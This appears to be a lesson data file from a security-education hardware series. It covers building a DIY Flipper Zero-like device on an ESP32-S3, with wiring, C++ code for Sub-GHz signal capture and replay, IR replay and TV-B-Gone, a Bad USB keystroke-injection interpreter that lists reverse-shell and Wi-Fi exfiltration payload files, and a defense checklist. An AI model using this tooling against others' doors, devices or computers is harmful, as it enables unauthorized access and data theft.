            '<rect x="60" y="315" width="600" height="35" rx="5" fill="rgba(220,38,38,0.04)" stroke="rgba(220,38,38,0.15)" stroke-width="0.5"/>' +
            '<text x="360" y="335" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">Sub-GHz RF + NFC/RFID + IR Remote + USB HID + WiFi + Bluetooth = $25 Multi-Tool</text>' +
            '</svg>' +
            '</div>',

        wiring: '    FULL WIRING DIAGRAM\n' +
                '\n' +
                '    ESP32-S3 --> CC1101 (Sub-GHz, SPI bus 1)\n' +
                '    GPIO35 (MOSI)  --> CC1101 MOSI\n' +
                '    GPIO37 (MISO)  --> CC1101 MISO\n' +
                '    GPIO36 (SCK)   --> CC1101 SCK\n' +
                '    GPIO38 (CS)    --> CC1101 CSN\n' +
                '    GPIO39         --> CC1101 GDO0\n' +
                '    3V3            --> CC1101 VCC\n' +
                '    GND            --> CC1101 GND\n' +
                '\n' +
                '    ESP32-S3 --> RC522 (NFC, SPI bus 2)\n' +
                '    GPIO11 (MOSI)  --> RC522 MOSI\n' +
                '    GPIO13 (MISO)  --> RC522 MISO\n' +
                '    GPIO12 (SCK)   --> RC522 SCK\n' +
                '    GPIO10 (CS)    --> RC522 SDA\n' +
                '    GPIO14         --> RC522 RST\n' +
                '    3V3            --> RC522 3.3V\n' +
                '    GND            --> RC522 GND\n' +
                '\n' +
                '    ESP32-S3 --> IR\n' +
                '    GPIO40 --> IR LED (via NPN transistor + 100ohm)\n' +
                '    GPIO41 --> TSOP38238 OUT\n' +
                '    3V3    --> TSOP38238 VCC\n' +
                '    GND    --> TSOP38238 GND\n' +
                '\n' +
                '    ESP32-S3 --> TFT ST7735 (SPI shared with RC522)\n' +
                '    GPIO11 (MOSI) --> TFT SDA   (shared)\n' +
                '    GPIO12 (SCK)  --> TFT SCK   (shared)\n' +
                '    GPIO15 (CS)   --> TFT CS\n' +
                '    GPIO16 (DC)   --> TFT DC\n' +
                '    GPIO17 (RST)  --> TFT RES\n' +
                '    3V3           --> TFT VCC\n' +
                '    GND           --> TFT GND\n' +
                '\n' +
                '    Buttons (to GND, internal pull-up):\n' +
                '    GPIO1=UP  GPIO2=DOWN  GPIO3=LEFT  GPIO4=RIGHT  GPIO5=OK\n' +
                '\n' +
                '    MicroSD (SPI shared with RC522/TFT):\n' +
                '    GPIO11/12/13 (shared MOSI/SCK/MISO)  GPIO6=CS',

        wiringNotes: '<p><strong>Two SPI buses:</strong> The ESP32-S3 has two hardware SPI controllers (FSPI and HSPI). We use FSPI for the CC1101 and HSPI for the RC522/TFT/SD (which share the bus with separate CS pins). This avoids bus contention between the Sub-GHz radio and the NFC module.</p>' +
                     '<p><strong>IR circuit:</strong> The IR LED needs more current than a GPIO pin can provide. Use an NPN transistor (2N2222 or BC547) as a switch, with a 100-ohm resistor on the LED. This gives bright, long-range IR output.</p>' +
                     '<p><strong>This is a complex build:</strong> With 6 modules, 2 SPI buses, and 20+ wires, take your time with wiring. Label every wire. Test each module individually before connecting everything together.</p>',

        steps: [
            {
                title: 'Plan and Test Each Module Independently',
                content: '<p>Do not try to wire everything at once. Build and test each module separately, then combine them. The order:</p>' +
                         '<ol>' +
                         '<li><strong>ESP32-S3 + TFT display:</strong> Get the screen working first. This is your feedback mechanism for everything else.</li>' +
                         '<li><strong>Add buttons:</strong> Wire the 5 navigation buttons and build the menu system.</li>' +
                         '<li><strong>Add RC522 NFC:</strong> You already built this in SG-41. Same wiring, same code.</li>' +
                         '<li><strong>Add CC1101 Sub-GHz:</strong> New module &mdash; covered in Step 3.</li>' +
                         '<li><strong>Add IR TX/RX:</strong> Simple GPIO &mdash; covered in Step 4.</li>' +
                         '<li><strong>Add USB HID:</strong> ESP32-S3 native USB &mdash; same concept as SG-33.</li>' +
                         '<li><strong>Add MicroSD:</strong> For saving captured signals, payloads, and IR codes.</li>' +
                         '</ol>',
                code: null,
                language: null,
                tip: '<strong>Build philosophy:</strong> Get each module working in isolation with a simple test sketch before integrating. When you combine them, add one module at a time. This way, when something breaks, you know exactly which module caused the problem.'
            },
            {
                title: 'Build the Menu System',
                content: '<p>The menu system is the backbone of the device. It provides a navigable interface for all modules, similar to the Flipper Zero\'s UI.</p>',
                code: '#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\n// Button pins\n#define BTN_UP    1\n#define BTN_DOWN  2\n#define BTN_LEFT  3\n#define BTN_RIGHT 4\n#define BTN_OK    5\n\n// Menu structure\nstruct MenuItem {\n    const char* label;\n    void (*action)();\n};\n\n// Forward declarations\nvoid menu_subghz();\nvoid menu_nfc();\nvoid menu_ir();\nvoid menu_badusb();\nvoid menu_wifi();\nvoid menu_bluetooth();\nvoid menu_settings();\n\nMenuItem mainMenu[] = {\n    {"Sub-GHz",      menu_subghz},\n    {"NFC/RFID",     menu_nfc},\n    {"Infrared",     menu_ir},\n    {"Bad USB",      menu_badusb},\n    {"WiFi Tools",   menu_wifi},\n    {"Bluetooth",    menu_bluetooth},\n    {"Settings",     menu_settings},\n};\nint menuSize = sizeof(mainMenu) / sizeof(MenuItem);\nint menuIndex = 0;\n\nvoid drawMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_RED);\n    tft.setTextSize(1);\n    tft.setCursor(10, 5);\n    tft.println("DIY FLIPPER");\n    tft.drawLine(0, 15, 160, 15, TFT_DARKGREY);\n\n    for (int i = 0; i < menuSize; i++) {\n        int y = 22 + (i * 14);\n        if (i == menuIndex) {\n            tft.fillRect(0, y - 1, 160, 13, TFT_NAVY);\n            tft.setTextColor(TFT_WHITE);\n            tft.setCursor(5, y);\n            tft.print("> ");\n        } else {\n            tft.setTextColor(TFT_LIGHTGREY);\n            tft.setCursor(5, y);\n            tft.print("  ");\n        }\n        tft.println(mainMenu[i].label);\n    }\n}\n\nvoid handleButtons() {\n    if (digitalRead(BTN_UP) == LOW) {\n        menuIndex = (menuIndex - 1 + menuSize) % menuSize;\n        drawMenu();\n        delay(200);\n    }\n    if (digitalRead(BTN_DOWN) == LOW) {\n        menuIndex = (menuIndex + 1) % menuSize;\n        drawMenu();\n        delay(200);\n    }\n    if (digitalRead(BTN_OK) == LOW) {\n        mainMenu[menuIndex].action();\n        delay(200);\n    }\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    for (int pin : {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_OK}) {\n        pinMode(pin, INPUT_PULLUP);\n    }\n    drawMenu();\n}\n\nvoid loop() {\n    handleButtons();\n    delay(50);\n}',
                language: 'C++',
                tip: '<strong>Tip:</strong> Use the <code>TFT_eSPI</code> library for the display. It is fast, well-documented, and supports the ST7735 natively. Configure your pin mappings in <code>User_Setup.h</code> within the library folder.'
            },
            {
                title: 'Add Sub-GHz RF (CC1101)',
                content: '<p>The CC1101 is a programmable Sub-GHz transceiver that operates from 300MHz to 928MHz. It can receive and transmit signals used by garage door openers, car key fobs, wireless doorbells, weather stations, and other devices that communicate in the ISM bands (315MHz, 433MHz, 868MHz, 915MHz).</p>' +
                         '<p>Capabilities: signal capture, signal replay, frequency analysis, and brute-force (for simple fixed-code systems).</p>',
                code: '#include <ELECHOUSE_CC1101_SRC_DRV.h>\n\n// CC1101 on HSPI\n#define CC1101_CS  38\n#define CC1101_GDO0 39\n\nvoid menu_subghz() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_MAGENTA);\n    tft.println("Sub-GHz RF");\n    tft.setTextColor(TFT_WHITE);\n    tft.println("1. Scan frequencies");\n    tft.println("2. Capture signal");\n    tft.println("3. Replay signal");\n    tft.println("4. Frequency analyzer");\n}\n\nvoid subghz_capture() {\n    // Initialize CC1101 at 433.92 MHz (common frequency)\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.setMHZ(433.92);\n    ELECHOUSE_cc1101.SetRx();  // Enter receive mode\n\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_GREEN);\n    tft.println("Listening on 433.92MHz...");\n    tft.println("Press a remote button now.");\n\n    // Capture raw signal\n    uint8_t buffer[256];\n    int len = 0;\n    unsigned long timeout = millis() + 10000;  // 10s timeout\n\n    while (millis() < timeout) {\n        if (ELECHOUSE_cc1101.CheckReceiveFlag()) {\n            len = ELECHOUSE_cc1101.ReceiveData(buffer);\n            if (len > 0) {\n                tft.setTextColor(TFT_YELLOW);\n                tft.printf("Captured %d bytes!\\n", len);\n\n                // Save to SD card\n                File f = SD.open("/signals/capture.raw", FILE_WRITE);\n                f.write(buffer, len);\n                f.close();\n\n                tft.println("Saved to SD card.");\n                break;\n            }\n        }\n    }\n    ELECHOUSE_cc1101.setSidle();  // Return to idle\n}\n\nvoid subghz_replay() {\n    // Read captured signal from SD\n    File f = SD.open("/signals/capture.raw", FILE_READ);\n    if (!f) {\n        tft.println("No capture file found!");\n        return;\n    }\n\n    uint8_t buffer[256];\n    int len = f.read(buffer, sizeof(buffer));\n    f.close();\n\n    // Transmit\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.setMHZ(433.92);\n    ELECHOUSE_cc1101.SetTx();\n\n    tft.println("Replaying signal...");\n    ELECHOUSE_cc1101.SendData(buffer, len);\n\n    tft.setTextColor(TFT_GREEN);\n    tft.println("Signal transmitted!");\n    ELECHOUSE_cc1101.setSidle();\n}',
                language: 'C++',
                tip: '<strong>Legal note:</strong> Transmitting on certain frequencies requires a license in most countries. For testing, use low power settings and only interact with devices you own. Replaying garage door signals on someone else\'s property is illegal.'
            },
            {
                title: 'Add Infrared (IR) Module',
                content: '<p>The IR module captures and replays infrared signals from remote controls. This works on TVs, air conditioners, projectors, soundbars, and any device with an IR remote. The Flipper Zero\'s IR module is one of its most used features &mdash; it can turn off any TV in range.</p>',
                code: '#include <IRremoteESP8266.h>\n#include <IRrecv.h>\n#include <IRsend.h>\n#include <IRutils.h>\n\n#define IR_RECV_PIN 41\n#define IR_SEND_PIN 40\n\nIRrecv irrecv(IR_RECV_PIN);\nIRsend irsend(IR_SEND_PIN);\ndecode_results results;\n\nvoid menu_ir() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_YELLOW);\n    tft.println("Infrared");\n    tft.setTextColor(TFT_WHITE);\n    tft.println("1. Learn remote");\n    tft.println("2. Replay signal");\n    tft.println("3. TV-B-Gone");\n    tft.println("4. Saved remotes");\n}\n\nvoid ir_learn() {\n    irrecv.enableIRIn();\n    tft.fillScreen(TFT_BLACK);\n    tft.println("Point remote at receiver...");\n    tft.println("Press any button on remote.");\n\n    while (true) {\n        if (irrecv.decode(&results)) {\n            tft.setTextColor(TFT_GREEN);\n            tft.printf("Protocol: %s\\n",\n                typeToString(results.decode_type).c_str());\n            tft.printf("Code: 0x%08X\\n", results.value);\n            tft.printf("Bits: %d\\n", results.bits);\n\n            // Save to SD card\n            File f = SD.open("/ir/captured.txt", FILE_APPEND);\n            f.printf("%s,0x%08X,%d\\n",\n                typeToString(results.decode_type).c_str(),\n                results.value, results.bits);\n            f.close();\n\n            tft.println("Saved! Press another or BACK.");\n            irrecv.resume();\n        }\n        if (digitalRead(BTN_LEFT) == LOW) break;\n    }\n}\n\nvoid ir_replay(uint32_t code, int bits, decode_type_t protocol) {\n    switch (protocol) {\n        case NEC:  irsend.sendNEC(code, bits); break;\n        case SONY: irsend.sendSony(code, bits); break;\n        case RC5:  irsend.sendRC5(code, bits); break;\n        case RC6:  irsend.sendRC6(code, bits); break;\n        case SAMSUNG: irsend.sendSAMSUNG(code, bits); break;\n        default:   irsend.sendRaw(/* raw timing data */);\n    }\n}\n\n// TV-B-Gone: cycle through common TV power codes\nvoid ir_tvbgone() {\n    tft.fillScreen(TFT_BLACK);\n    tft.println("TV-B-Gone Mode");\n    tft.println("Sending power codes...");\n\n    // Common TV power-off codes (NEC protocol)\n    uint32_t powerCodes[] = {\n        0x20DF10EF,  // LG\n        0xE0E040BF,  // Samsung\n        0x40040100,  // Sony\n        0x00FF629D,  // Generic\n    };\n\n    for (uint32_t code : powerCodes) {\n        irsend.sendNEC(code, 32);\n        delay(100);\n    }\n    tft.println("Done!");\n}',
                language: 'C++',
                tip: '<strong>TV-B-Gone:</strong> The original TV-B-Gone by Mitch Altman stored ~230 TV power codes and cycled through them. Your DIY version can store thousands of codes on the SD card. Build a database from the IRDB project on GitHub, which has IR codes for most devices ever made.'
            },
            {
                title: 'Add USB HID (Bad USB)',
                content: '<p>The ESP32-S3 has native USB-OTG support, which means it can enumerate as a USB keyboard without any external hardware. This is the same Rubber Ducky functionality from SG-33, now integrated into your multi-tool.</p>',
                code: '#include "USB.h"\n#include "USBHIDKeyboard.h"\n\nUSBHIDKeyboard Keyboard;\n\nvoid menu_badusb() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_RED);\n    tft.println("Bad USB");\n    tft.setTextColor(TFT_WHITE);\n    tft.println("1. Run payload");\n    tft.println("2. Select payload");\n    tft.println("3. Edit payload");\n}\n\nvoid badusb_run(const char* payloadFile) {\n    // Initialize USB HID\n    USB.begin();\n    Keyboard.begin();\n    delay(1000);  // Wait for OS recognition\n\n    // Read payload from SD card\n    File f = SD.open(payloadFile);\n    if (!f) {\n        tft.println("Payload not found!");\n        return;\n    }\n\n    tft.println("Executing payload...");\n\n    // Simple DuckyScript interpreter\n    while (f.available()) {\n        String line = f.readStringUntil(\'\\n\');\n        line.trim();\n\n        if (line.startsWith("REM")) {\n            // Comment, skip\n        } else if (line.startsWith("DELAY")) {\n            int ms = line.substring(6).toInt();\n            delay(ms);\n        } else if (line.startsWith("STRING")) {\n            Keyboard.print(line.substring(7));\n        } else if (line == "ENTER") {\n            Keyboard.press(KEY_RETURN);\n            Keyboard.releaseAll();\n        } else if (line == "GUI r" || line == "WINDOWS r") {\n            Keyboard.press(KEY_LEFT_GUI);\n            Keyboard.press(\'r\');\n            Keyboard.releaseAll();\n        } else if (line == "CTRL ALT t") {\n            Keyboard.press(KEY_LEFT_CTRL);\n            Keyboard.press(KEY_LEFT_ALT);\n            Keyboard.press(\'t\');\n            Keyboard.releaseAll();\n        }\n    }\n    f.close();\n\n    Keyboard.end();\n    tft.println("Payload complete!");\n}\n\n// DuckyScript payload files on SD card:\n// /payloads/rickroll.txt\n// /payloads/revshell.txt\n// /payloads/wifi_exfil.txt',
                language: 'C++',
                tip: '<strong>DuckyScript compatibility:</strong> The Flipper Zero uses a DuckyScript-compatible language for Bad USB payloads. By implementing the same interpreter, your DIY device can run payloads written for the Flipper or Hak5 Rubber Ducky directly.'
            },
            {
                title: 'Defense: Multi-Tool Threat Assessment',
                content: '<p>A device like this (or a Flipper Zero) combines multiple attack vectors. Here is the comprehensive defense posture:</p>' +
                         '<ul>' +
                         '<li><strong>Sub-GHz:</strong> Replace fixed-code garage openers with rolling-code systems (KeeLoq, etc.). Rolling codes change with every press, making replay attacks ineffective.</li>' +
                         '<li><strong>NFC/RFID:</strong> Upgrade to DESFire EV3 or SEOS. Use multi-factor (card + PIN). See SG-41 defenses.</li>' +
                         '<li><strong>IR:</strong> IR is inherently insecure (no authentication). For critical systems, do not use IR control. Use wired or encrypted wireless control instead.</li>' +
                         '<li><strong>USB HID:</strong> USB device whitelisting, port locks, endpoint protection. See SG-33 defenses.</li>' +
                         '<li><strong>WiFi:</strong> WPA3, 802.11w, WIDS. See SG-35 and SG-38 defenses.</li>' +
                         '<li><strong>Physical security:</strong> Devices like this require physical proximity. Access control, cameras, and security awareness training are your first line of defense.</li>' +
                         '<li><strong>Policy:</strong> Prohibit personal electronic devices in sensitive areas. Enforce this with physical screening (metal detectors, bag checks) in high-security environments.</li>' +
                         '</ul>',
                code: '# Security audit checklist for your organization:\n\n# 1. Garage / gate access\necho "[ ] Rolling code remotes (not fixed code)"\necho "[ ] Timed auto-lock on gates"\necho "[ ] Camera on gate/garage entry"\n\n# 2. Building access\necho "[ ] RFID cards: DESFire EV2+ or iCLASS SE"\necho "[ ] Multi-factor: card + PIN minimum"\necho "[ ] Visitor badges that expire automatically"\necho "[ ] Anti-tailgating measures"\n\n# 3. Network\necho "[ ] WPA3-Enterprise with 802.1X"\necho "[ ] 802.11w PMF required"\necho "[ ] WIDS deployed and monitored"\necho "[ ] 802.1X on all switch ports"\n\n# 4. Endpoints\necho "[ ] USB device whitelisting"\necho "[ ] USB port locks on unattended machines"\necho "[ ] EDR solution deployed"\necho "[ ] PowerShell constrained language mode"\n\n# 5. Physical\necho "[ ] No personal USB devices policy"\necho "[ ] Security awareness training (quarterly)"\necho "[ ] Regular physical audits of network closets"',
                language: 'Bash',
                tip: '<strong>The big picture:</strong> Building this device teaches you that many everyday systems (garage doors, access cards, TV remotes, USB ports) have weak or nonexistent security. As a security professional, your job is to identify these weaknesses and push for stronger controls. The tools are educational &mdash; the knowledge is what matters.'
            }
        ],

        testing: '<p>Test each module systematically:</p>' +
                 '<ul>' +
                 '<li><strong>Display + menu:</strong> Power on. The TFT should show the main menu. Navigate through all options with buttons.</li>' +
                 '<li><strong>NFC:</strong> Select NFC &rarr; Read Card. Hold a card to the RC522. UID and card type should display on screen.</li>' +
                 '<li><strong>Sub-GHz:</strong> Select Sub-GHz &rarr; Capture. Press a cheap 433MHz remote (wireless doorbell remotes work well). The device should capture and save the signal. Replay it and verify the doorbell rings.</li>' +
                 '<li><strong>IR:</strong> Select IR &rarr; Learn. Press a TV remote button aimed at the receiver. Protocol, code, and bit count should display. Replay it and verify the TV responds.</li>' +
                 '<li><strong>Bad USB:</strong> Create a simple DuckyScript payload on the SD card (STRING "Hello World" + ENTER). Select Bad USB &rarr; Run. Plug into a computer with a text editor open. "Hello World" should be typed.</li>' +
                 '<li><strong>SD card:</strong> Verify captured signals, IR codes, and payloads are saved and loadable.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'SPI Bus Conflicts',
                description: 'With 4+ SPI devices, bus conflicts are the #1 problem. Ensure each device has its own CS pin and that only one device is selected at a time. Use two separate SPI buses (FSPI + HSPI) to isolate the CC1101 from other modules.'
            },
            {
                title: 'Power Budget Exceeded',
                description: 'The ESP32-S3 + CC1101 + RC522 + TFT + SD can draw 300-500mA total. A standard USB port provides 500mA max. Use a quality USB cable and a power supply rated for at least 1A. If running on battery, use a TP4056 charge module with a 1200mAh+ LiPo.'
            },
            {
                title: 'Antenna Interference',
                description: 'The CC1101 antenna, ESP32 WiFi antenna, and NFC coil are all radiating RF. Keep them physically separated on the breadboard. The CC1101 antenna should be at least 5cm from the ESP32 to avoid desensing.'
            }
        ]
    }

};
